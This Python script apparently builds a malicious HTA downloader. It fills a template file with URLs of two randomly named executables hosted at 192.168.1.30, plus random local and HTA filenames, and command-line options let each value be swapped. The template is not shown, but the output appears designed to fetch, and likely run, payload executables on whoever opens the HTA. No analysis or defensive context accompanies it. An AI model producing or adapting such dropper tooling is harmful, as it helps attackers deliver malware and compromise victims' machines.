#!/usr/bin/env python   
# _*_ coding:utf-8 _*_ 
import os
import optparse

downloadfile1 = "http://192.168.1.30/QaMG6tjypFHaKYPL.exe"
ownfile1 = "QaMG6tjypFHaKYPL.exe"
downloadfile2 = "http://192.168.1.30/rYa5lUhEFD6llgIv.exe"
ownfile2 = "rYa5lUhEFD6llgIv.exe"
createfilename = "9C1KOoMovsIevYKE.hta"

def main():
	with open("DownloadURLFile.hta", "r") as readfile:
		with open("Download.hta", "w") as writefile:
			data = readfile.read()
			offset = data.find("DOWNLOADFILE1", 0)
			data = data[:offset] + downloadfile1 + data[offset+13:]
			offset = data.find("DOWNLOADFILE2", 0)
			data = data[:offset] + downloadfile2 + data[offset+13:]
			offset = data.find("OWNFILE1", 0)
			data = data[:offset] + ownfile1 + data[offset+8:]
			offset = data.find("OWNFILE2", 0)
			data = data[:offset] + ownfile2 + data[offset+8:]
			offset = data.find("OWNFILE3", 0)
			data = data[:offset] + ownfile1 + data[offset+8:]
			offset = data.find("CREATEFILENAME1", 0)
			data = data[:offset] + createfilename + data[offset+15:]
			offset = data.find("CREATEFILENAME2", 0)
			data = data[:offset] + createfilename + data[offset+15:]
			writefile.write(data)

if __name__ == '__main__':
	parse = optparse.OptionParser()  
	parse.add_option('-a', '--downloadfile1', dest='downloadfile1', type=str)
	parse.add_option('-b', '--downloadfile2', dest='downloadfile2', type=str)
	parse.add_option('-c', '--ownfile1', dest='ownfile1', type=str)
	parse.add_option('-d', '--ownfile2', dest='ownfile2', type=str)
	parse.add_option('-e', '--createfilename', dest='createfilename', type=str)
	options,args=parse.parse_args()
	if options.downloadfile1 != None:
		downloadfile1 = options.downloadfile1

	if options.downloadfile2 != None:
		downloadfile2 = options.downloadfile2

	if options.ownfile1 != None:
		ownfile1 = options.ownfile1

	if options.ownfile2 != None:
		ownfile2 = options.ownfile2

	if options.createfilename != None:
		createfilename = options.createfilename
	main()